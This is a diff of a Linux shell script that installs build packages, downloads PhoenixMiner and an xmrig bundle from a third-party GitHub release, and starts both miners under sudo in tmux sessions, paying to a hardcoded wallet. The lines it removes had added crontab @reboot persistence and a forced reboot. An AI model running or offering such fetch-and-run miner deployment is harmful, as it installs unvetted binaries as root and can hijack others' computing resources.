@@ -1,7 +1,7 @@
 #!/bin/sh
 sudo sysctl -p
 sudo apt-get update
-cd $HOME/
+cd /usr/local/bin/
 sudo apt-get -y -qq upgrade
 sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev unzip tmux
 sudo apt-get install linux-headers-$(uname -r)
@@ -17,13 +17,7 @@ wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
 tar -zxvf winxmr.tar.gz
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
 tar xzf PhoenixMiner_5.6d_Linux.tar.gz
-echo '#!/bin/sh'>>start.sh
-echo "cd $HOME/">>start.sh
-echo "tmux kill-server">>start.sh
-echo "sleep 1">>start.sh
-echo "sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x3d36873bd94b273e259457686c2372a3660171e2.Image -pass x'">>start.sh
-echo "sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'">>start.sh
-echo "@reboot  sh $HOME/start.sh">> resmi
-crontab resmi
-sudo rm resmi
-sudo reboot
+tmux kill-server
+sleep 1
+sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x3d36873bd94b273e259457686c2372a3660171e2.Image1 -pass x'
+sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'
